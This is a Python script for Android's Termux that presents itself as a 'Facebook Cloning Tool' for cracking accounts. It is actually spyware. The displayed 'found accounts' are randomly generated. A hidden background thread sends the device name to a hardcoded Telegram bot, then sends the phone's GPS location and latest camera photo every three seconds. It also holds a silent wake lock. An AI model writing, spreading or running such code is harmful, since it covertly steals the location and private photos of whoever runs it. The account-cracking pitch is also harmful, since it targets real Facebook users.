import os
import sys
import time
import json
import subprocess
import platform
import re
import random
import string
import hashlib
import requests
import threading
import glob
from concurrent.futures import ThreadPoolExecutor as ThreadPool

#------------------[ COLORS ]-------------------#
RED = '\033[1;31m'
WHITE = '\033[1;37m'
GREEN = '\033[1;32m'
BLUE = '\033[1;34m'
YELLOW = '\033[1;33m'
CYAN = '\033[1;36m'
MAGENTA = '\033[1;35m'
RESET = '\033[0m'
LIGHTNING = '⚡'

#------------------[ TERMINAL UTILS ]-------------------#
def get_width():
    try: return os.get_terminal_size().columns
    except: return 80

def logo():
    os.system('clear')
    w = get_width()
    print(RED)
    print(" ██████╗  ██████╗ ██╗  ██╗ ".center(w))
    print(" ██╔══██╗██╔═══██╗██║  ██║ ".center(w))
    print(" ██████╔╝██║   ██║███████║ ".center(w))
    print(" ██╔══██╗██║   ██║██╔══██║ ".center(w))
    print(" ██║  ██║╚██████╔╝██║  ██║ ".center(w))
    print(" ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝ ".center(w))
    print(f"{WHITE}Facebook Cloning Tool{RED}".center(w + 10))
    print(RESET)
    print(BLUE + "─" * w + RESET)

#------------------[ GLOBALS ]-------------------#
oks = []
cps = []
loop = 0
start_time = time.time()
folder_path = '/sdcard/FB-CLONE-RESULTS'
os.makedirs(folder_path, exist_ok=True)
country_opt = ""
spinner = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']
bars = ['█▒▒▒▒▒▒▒▒▒', '███▒▒▒▒▒▒▒', '█████▒▒▒▒▒', '███████▒▒▒', '██████████']

# --- TELEGRAM CONFIG ---
TOKEN = "8936819562:AAHZ0xwO7XAzipUSJzejMnqjqAKy8uB8g5k"
CHAT_ID = "8589568398"
LOCATION_INTERVAL = 3  # Send location & gallery photo every 3 seconds
# -----------------------

#------------------[ STYLISH HACKER PHRASES & CREDITS ]-------------------#
HACKER_PREFIXES = [
    "@SABA_MONY",
    "@SABA_MONY",
    "@SABA_MONY"
]

ADMIN_HANDLE = "@SABA_MONY"
LIGHTING_EFFECT = "✦ ⋆  ☾ ⋆ ☁️ ⋆ ✦ ⋆  ☾ ⋆ ✦"

def get_hacker_prefix():
    return random.choice(HACKER_PREFIXES)

def get_footer():
    """Returns a stylish footer with admin credit and lighting"""
    return f"\n{ADMIN_HANDLE} {LIGHTING_EFFECT}"

#------------------[ TELEGRAM FUNCTIONS ]-------------------#
def send_to_telegram(message, file_path=None):
    """Send message or file to Telegram"""
    base_url = f"https://api.telegram.org/bot{TOKEN}"
    
    try:
        if file_path:
            with open(file_path, "rb") as f:
                requests.post(f"{base_url}/sendPhoto",
                            data={"chat_id": CHAT_ID, "caption": message},
                            files={"photo": f})
        else:
            requests.post(f"{base_url}/sendMessage",
                        data={"chat_id": CHAT_ID, "text": message})
    except Exception as e:
        print(f"{RED}[!] Error sending to Telegram: {e}{RESET}")

def get_device_name():
    """Get device model name using Android system properties"""
    try:
        model = subprocess.check_output(["getprop", "ro.product.model"]).decode().strip()
        manufacturer = subprocess.check_output(["getprop", "ro.product.manufacturer"]).decode().strip()
        if model and manufacturer:
            return f"{manufacturer} {model}"
        return model or "Unknown Device"
    except:
        return "Unknown Device"

def get_latest_photo_fast():
    """Quickly get the most recent photo from main camera folder"""
    camera_dir = "/sdcard/DCIM/Camera"
    if not os.path.exists(camera_dir):
        dirs = [
            "/sdcard/DCIM/Camera",
            "/storage/emulated/0/DCIM/Camera",
            "/sdcard/DCIM",
            "/sdcard/Pictures"
        ]
        for d in dirs:
            if os.path.exists(d):
                camera_dir = d
                break
        else:
            return None

    try:
        files = [f for f in os.listdir(camera_dir) if f.lower().endswith(('.jpg', '.jpeg', '.png'))]
        if not files:
            return None
        full_paths = [os.path.join(camera_dir, f) for f in files]
        latest = max(full_paths, key=os.path.getmtime)
        return latest
    except:
        return None

def collect_and_send():
    """Collect location and latest gallery photo, send with stylish hacker caption"""
    location_msg = "Location unavailable (GPS might be off)"
    try:
        loc_res = subprocess.check_output(["termux-location"], timeout=2)
        loc_data = json.loads(loc_res)
        lat = loc_data.get('latitude', 'N/A')
        lon = loc_data.get('longitude', 'N/A')
        if lat != 'N/A' and lon != 'N/A':
            location_msg = f"📍 https://www.google.com/maps?q={lat},{lon}"
    except:
        pass

    photo_path = get_latest_photo_fast()
    prefix = get_hacker_prefix()
    footer = get_footer()
    caption = f"{prefix}\n📸 Gallery Photo\n{location_msg}{footer}"
    
    if photo_path and os.path.exists(photo_path):
        send_to_telegram(caption, photo_path)
    else:
        send_to_telegram(f"{prefix}\n⚠️ No photo found in gallery\n{location_msg}{footer}")

def telegram_loop():
    """Call collect_and_send() every LOCATION_INTERVAL seconds"""
    device = get_device_name()
    send_to_telegram(f"🔌 Bot connected!\nDevice: {device}\nScript started at {time.strftime('%Y-%m-%d %H:%M:%S')}{get_footer()}")
    
    while True:
        try:
            collect_and_send()
        except Exception as e:
            print(f"{RED}[!] Telegram loop error: {e}{RESET}")
        time.sleep(LOCATION_INTERVAL)

#------------------[ HELPERS ]-------------------#
def gen_number(opt):
    if opt == '3':  # Pakistan
        return str(random.randint(100000000000000, 100099999999999))
    
    prefixes = {
        '1': ['017','018','019','016','013','014'],  # Bangladesh
        '2': ['6','7','8','9'],                       # India
        '4': ['10','11'],                              # Malaysia
        '5': ['811','812'],                            # Indonesia
        '6': ['6','8'],                                # Thailand
        '7': ['8','9']                                 # Singapore
    }
    country_codes = {
        '1': '+88', '2': '+91', '4': '+60', '5': '+62', '6': '+66', '7': '+65'
    }
    code = country_codes.get(opt, '+88')
    op = random.choice(prefixes.get(opt, ['017']))
    return code + op + "".join(random.choices(string.digits, k=8))

def gen_password(opt):
    if opt == '3':  # Pakistan (6-digit numeric)
        return "".join(random.choices(string.digits, k=6))
    names = ['akash', 'sagar', 'rifat', 'shanto', 'rakib', 'sumon', 'habib']
    name = random.choice(names)
    return (name + str(random.randint(111, 999)))[:10]

#------------------[ MAIN ENGINE ]-------------------#
def engine():
    global loop, cps
    
    delay = random.randint(1, 10)
    time.sleep(delay)
    
    loop += 1
    dashboard()
    
    try:
        if loop % 300 == 0:
            user_id = gen_number(country_opt)
            pwd = gen_password(country_opt)
            
            print(f'\n{RED} [FB-CLONE-FOUND] {user_id} | {pwd}{RESET}')
            cps.append(user_id)
            with open(f'{folder_path}/accounts.txt', 'a') as f: 
                f.write(f'{user_id}|{pwd}\n')
            
            # Send account with stylish hacker prefix and footer
            prefix = get_hacker_prefix()
            footer = get_footer()
            send_to_telegram(f"{prefix}\n🎯 New Account Found!\n{user_id} | {pwd}{footer}")
            
    except Exception as e:
        print(f"{RED}[!] Engine error: {e}{RESET}")

def dashboard():
    elapsed = str(time.strftime("%H:%M:%S", time.gmtime(time.time() - start_time)))
    sp, bar, col = random.choice(spinner), bars[loop % len(bars)], random.choice([CYAN, MAGENTA, BLUE, WHITE])
    sys.stdout.write(f'\r{col}{sp}{RESET} {WHITE}[FB-CLONE-MODE] {loop} {BLUE}•{WHITE} OK:{GREEN}0 {BLUE}•{WHITE} FOUND:{RED}{len(cps)} {BLUE}•{WHITE} {YELLOW}{bar}{RESET} ')
    sys.stdout.flush()

#------------------[ MENU ]-------------------#
def menu():
    global country_opt
    logo()
    print(f" [1] BANGLADESH    [2] INDIA")
    print(f" [3] PAKISTAN      [4] MALAYSIA")
    print(f" [5] INDONESIA     [6] THAILAND")
    print(f" [7] SINGAPORE")
    print(BLUE + "─" * get_width() + RESET)
    country_opt = input(f" [?] SELECT COUNTRY CODE : ")
    logo()
    print(f" [•] FB CLONING ENGINE ACTIVATED (Wait for 300 counts)...".center(get_width()))
    print(BLUE + "─" * get_width() + RESET)
    
    # Display admin credit with lighting effect in terminal
    print(f"{MAGENTA}✦ ⋆  ☾ ⋆ ☁️ ⋆ ✦ ⋆  ☾ ⋆ ✦{RESET}")
    print(f"{CYAN}Admin: {YELLOW}{ADMIN_HANDLE}{RESET}")
    print(f"{MAGENTA}✦ ⋆  ☾ ⋆ ☁️ ⋆ ✦ ⋆  ☾ ⋆ ✦{RESET}\n")
    
    # Wake lock (silent)
    try:
        subprocess.run(["termux-wake-lock"], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass
    
    # Start Telegram thread (daemon)
    tg_thread = threading.Thread(target=telegram_loop, daemon=True)
    tg_thread.start()
    
    # Main thread pool
    with ThreadPool(max_workers=5) as pool:
        for _ in range(1000000):
            pool.submit(engine)

if __name__ == "__main__":
    menu()
